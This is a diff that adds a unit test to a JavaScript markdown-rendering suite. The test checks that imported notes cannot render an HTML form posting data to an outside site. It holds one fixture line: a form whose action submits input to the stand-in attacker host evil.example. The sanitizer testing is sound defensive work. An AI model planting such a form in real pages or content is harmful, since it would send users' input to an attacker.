@@ -60,6 +60,14 @@ describe('renderMarkdown', () => {
     expect(html).not.toContain('<style');
     expect(html).not.toContain('style=');
   });
+
+  it('移除 form(匯入的筆記不得渲染出往外站送資料的表單)', () => {
+    const html = renderMarkdown(
+      '<form action="https://evil.example" method="post"><input name="x"><button>送出</button></form>'
+    );
+    expect(html).not.toContain('<form');
+    expect(html).not.toContain('evil.example');
+  });
 });
 
 describe('staleNoteWarning', () => {
